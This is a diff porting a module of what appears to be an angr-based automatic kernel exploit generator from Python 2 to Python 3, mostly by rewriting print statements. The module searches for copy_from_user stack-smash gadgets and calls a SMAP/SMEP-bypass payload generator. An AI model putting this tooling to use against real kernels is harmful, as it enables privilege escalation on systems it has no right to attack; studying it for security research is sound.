@@ -6,7 +6,7 @@ try different copy_from_user gadget to perform stack smash :)
 import traceback
 import colorama
 from IPython import embed
-from state_filters import *
+from .state_filters import *
 
 
 class SmashGadgetMixin:
@@ -38,7 +38,7 @@ class SmashGadgetMixin:
 
         # currently we are in the entry of copy_to_user, so let's mimic a directly return from the site
         # as well as setting rax to non-zero value
-        print 'debug explore_state_for_second_fork_site'
+        print('debug explore_state_for_second_fork_site')
         self.dump_stack(disclosure_state)
         twin_disclosure_state = disclosure_state.copy()
         # embed()
@@ -79,52 +79,48 @@ class SmashGadgetMixin:
         disclosure_states.append(disclosure_state)
 
         target_fork_site = second_fork_site
-        print 'target fork site is: %x' % target_fork_site
+        print('target fork site is: %x' % target_fork_site)
 
         # create a simulation manager
         simgr = self.b.factory.simgr(disclosure_states, save_unconstrained=True)
-        #raw_input('inspect the state now?')
+        #input('inspect the state now?')
         #import IPython; IPython.embed()
         loop_idx = 0
         while True:
-            print '[+] ' + str(loop_idx) + ' step()'
+            print('[+] ' + str(loop_idx) + ' step()')
             try:
-                print '[+] stepping'
+                print('[+] stepping')
                 simgr.step(stash='active')
-                #print simgr.active
-                #print '[+] removing state with bad rip to deadended stash'
+                #print(simgr.active)
+                #print('[+] removing state with bad rip to deadended stash')
                 simgr.move(from_stash='active', to_stash='deadended', filter_func=filter_bad_rip)
                 for deadend_state in simgr.deadended:
                     simgr.deadended.remove(deadend_state)
                 loop_idx += 1
 
             except all as e:
-                print e
-                print 'wtf simgr error'
+                print(e)
+                print('wtf simgr error')
                 traceback.print_exc()
-                raw_input()
+                input()
                 del simgr
                 break
 
             # has unconstrained states
             if simgr.unconstrained:
-                #print 'has unconstrained state..'
                 for ucstate in simgr.unconstrained:
-                    #print 'inspect the unconstrained state', ucstate
-                    #print 'appending unconstrained state to candidate states'
-                    # embed()
                     candidate_states.append(ucstate.copy())
                     if target_fork_site in self.b.factory.block(ucstate.history.addr).instruction_addrs:
                         reach_target_fork_site = True
                     simgr.unconstrained.remove(ucstate)
                     # import IPython; IPython.embed()
             if loop_idx > 7:
-                #print 'too many steps...aborting...'
+                #print('too many steps...aborting...')
                 del simgr
                 break
 
             if reach_target_fork_site:  # already the target fork site
-                #print 'already reach target fork site, stop exploring'
+                #print('already reach target fork site, stop exploring')
                 del simgr
                 break
 
@@ -137,17 +133,17 @@ class SmashGadgetMixin:
         :return:
         """
         state = active_state.copy()
-        print 'evaluating smash state...'
+        print('evaluating smash state...')
         #self.debug_state(state)
         # check if rdi is stack location
         if self.is_stack_address(state, state.se.eval(state.regs.rdi)):
-            print '[+] rdi points to stack'
+            print('[+] rdi points to stack')
             # check if rsi is user space location
             state.add_constraints(state.regs.rsi < 0x7fff00000000)
             state.add_constraints(state.regs.rsi > 0x10000)
             # check if rdx is symbolic value
             if state.regs.rdx.symbolic:
-                print '[+] rdx is symbolic'
+                print('[+] rdx is symbolic')
                 number_of_saved_register = self.current_smash_gadget[0]
                 canary_position = self.current_smash_gadget[1]
                 if self.reproduce_mode:  # in reproduce mode, we concretize payload length to concrete value
@@ -159,14 +155,14 @@ class SmashGadgetMixin:
                     state.add_constraints(state.regs.rdx > minimal_smash_payload_len)
                     state.add_constraints(state.regs.rdx < 0x200)
                 if state.satisfiable():
-                    print colorama.Fore.MAGENTA, '[+] rsi could point to user space with legit copy length :)',\
-                        colorama.Style.RESET_ALL
+                    print(colorama.Fore.MAGENTA, '[+] rsi could point to user space with legit copy length :)',\
+                        colorama.Style.RESET_ALL)
                     self.current_smash_payload_len = minimal_smash_payload_len
-                    print 'blooming gadget', self.current_bloom_gadget[1]
-                    print 'forking gadget', self.current_forking_gadget[1]
-                    print 'prologue gadget', self.current_prologue_gadget[5]
-                    print 'disclosure gadget:', self.current_disclosure_gadget[3]
-                    print 'smash gadget:', self.current_smash_gadget[3]
+                    print('blooming gadget', self.current_bloom_gadget[1])
+                    print('forking gadget', self.current_forking_gadget[1])
+                    print('prologue gadget', self.current_prologue_gadget[5])
+                    print('disclosure gadget:', self.current_disclosure_gadget[3])
+                    print('smash gadget:', self.current_smash_gadget[3])
                     # embed()
                     del state
                     return True
@@ -174,13 +170,13 @@ class SmashGadgetMixin:
                     if self.reproduce_mode:
                         #embed()
                         pass
-                    print 'rdx', state.regs.rdx
-                    print 'rsi', state.regs.rsi
+                    print('rdx', state.regs.rdx)
+                    print('rsi', state.regs.rsi)
                     for constrain in state.history.actions:
-                        print constrain
-                    print '[!] not satisfiable'
+                        print(constrain)
+                    print('[!] not satisfiable')
         else:
-            print 'rdi does not point to stack..'
+            print('rdi does not point to stack..')
         del state
         return False
 
@@ -210,7 +206,7 @@ class SmashGadgetMixin:
                     sub_gadget_entry.append(sub_entry['addr'])
             return sub_gadget_entry
         except KeyError as e:
-            print e
+            print(e)
             traceback.print_exc()
             embed()
 
@@ -230,14 +226,14 @@ class SmashGadgetMixin:
 
         simgr = self.b.factory.simgr(new_states, save_unconstrained=True)
         # we are only one step away from the site
-        print 'stepping to the smash site'
+        print('stepping to the smash site')
         simgr.step()  # we need only a single step to reach the stack smash site
         # check all active states for good smash state
         for active_state in simgr.stashes['active']:
-            print active_state
+            print(active_state)
             # check if smash requirements are satisfied
             if self.is_good_smash_site(active_state):
-                print colorama.Fore.RED + 'found good smash state...' + colorama.Style.RESET_ALL
+                print(colorama.Fore.RED + 'found good smash state...' + colorama.Style.RESET_ALL)
                 if store_smash_state is True:
                     good_smash_state.append([active_state.copy(), self.current_bloom_gadget, self.current_forking_gadget
                                             , self.current_prologue_gadget, self.current_disclosure_gadget
@@ -247,7 +243,7 @@ class SmashGadgetMixin:
                                             , self.current_prologue_gadget, self.current_disclosure_gadget
                                             , self.current_smash_gadget])
                 # try payload generation
-                print '[+] try generating payload...'
+                print('[+] try generating payload...')
                 success = self.gen_payload_smap_smep_bypass(active_state)
                 del active_state
                 if success:
@@ -279,24 +275,24 @@ class SmashGadgetMixin:
         # firstly try to explore until the second fork site state.
         second_fork_site_state = self.explore_state_for_second_fork_site(good_disclosure_state)
         if len(second_fork_site_state) == 0:
-            print 'cannot find second fork site'
+            print('cannot find second fork site')
             return False
         else:
-            print colorama.Fore.CYAN + 'successfully found %d second fork site' % len(second_fork_site_state)\
-                + colorama.Style.RESET_ALL
+            print(colorama.Fore.CYAN + 'successfully found %d second fork site' % len(second_fork_site_state)\
+                + colorama.Style.RESET_ALL)
             # embed()
             for i, smash_gadget in enumerate(self.smash_gadgets):
-                print '^^^^^^ checking %d/%d smash gadget ^^^^^^' % (i, len(self.smash_gadgets))
+                print('^^^^^^ checking %d/%d smash gadget ^^^^^^' % (i, len(self.smash_gadgets)))
                 # currently we do not handle rbp gadgets
                 if smash_gadget[2] == 'rsp':
-                    print 'rsp smash gadget'
+                    print('rsp smash gadget')
                     good_smash_states = self.run_rsp_smash_gadget(second_fork_site_state, smash_gadget, store_smash_state)
                     if len(good_smash_states) > 0:
                         self.good_smash_states += list(good_smash_states)
                         res = True
                     del good_smash_states
                 elif smash_gadget[2] == 'rbp':
-                    print 'rbp smash gadget'
+                    print('rbp smash gadget')
                     good_smash_states = self.run_rbp_smash_gadget(second_fork_site_state, smash_gadget, store_smash_state)
                     if len(good_smash_states) > 0:
                         self.good_smash_states += list(good_smash_states)
